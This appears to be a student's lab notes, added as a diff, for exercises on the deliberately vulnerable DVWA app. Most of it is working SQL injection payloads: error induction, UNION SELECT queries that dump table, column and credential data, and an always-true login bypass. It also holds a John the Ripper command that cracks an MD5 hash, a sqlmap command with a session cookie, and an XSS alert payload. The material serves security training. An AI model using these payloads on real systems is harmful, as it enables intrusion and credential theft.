@@ -1,0 +1,112 @@
+DVWA - 
+
+- Perform Command Injection (Low, Medium, High) - Countermeasure
+
+DVWA - Perform SQLi 
+
+-  Induce error
+
+- Get all user details
+
+- Get column info
+
+-  Get user, database, version info
+
+-  Get table name, column names
+
+- Get credentials
+
+- Crack found password using John the ripper or similar tools (Hashcat, Medusa...)
+
+- Report countermeasures
+
+** Bonus: Use SQLMap 
+
+
+
+It assignment 
+topic Report on malware, impact, attack pattern,category 
+deadline: 23rd Feb 2024
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+......................................................
+1
+2
+
+1' 
+#error
+
+' OR 1=1 #
+
+
+To find the number of columns
+1' order by 1#
+
+1' order by 2#
+
+1' order by 3#
+This verifies that we had no further columns in our table.
+
+1' union select user(),database()#
+This shows the username and database name.
+
+0' union select 1,group_concat(table_name) from information_schema.tables where table_schema='dvwa'#
+This shows the table of the db that is users and guestbook.
+
+0' union select 1,group_concat(column_name) from information_schema.columns where table_schema='dvwa' and table_name='users'#
+This shows all the columns of the table which we fetched from the table users.
+
+0' union select user,password from dvwa.users limit 0,1#
+We got the username and password which is hash encrypted.
+
+0' union select user,password from dvwa.users#
+
+
+echo e99a18c428cb38d5f260853678922e03 > /home/kali/Desktop/pass.txt
+
+john pass.txt --format=raw-MD5
+
+
+
+' OR 1=1 #
+
+sqlmap -u "http://192.168.226.131/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=d7f198751e14357f2a31ac2ed07ce788,security=low" --all
+
+
+
+
+XSS
+
+Perform XSS (stored, reflected, DOM) 
+
+- DVWA
+- mutillidae
+- http://demo.testfire.net/
+- http://testphp.vulnweb.com/
+
+Payload Resource: https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
+
+xss-payload-list/Intruder/xss-payload-list.txt at master · payloadbox/xss-payload-list · GitHub
+
+
+
+
+<script>alert("You have been Hacked!")</script>
+
+https://medium.com/@zhyarr/buffer-overflow-to-run-root-shell-a8e3028afc5e
+
+
+https://youtu.be/e7X6GaVMzPc
+
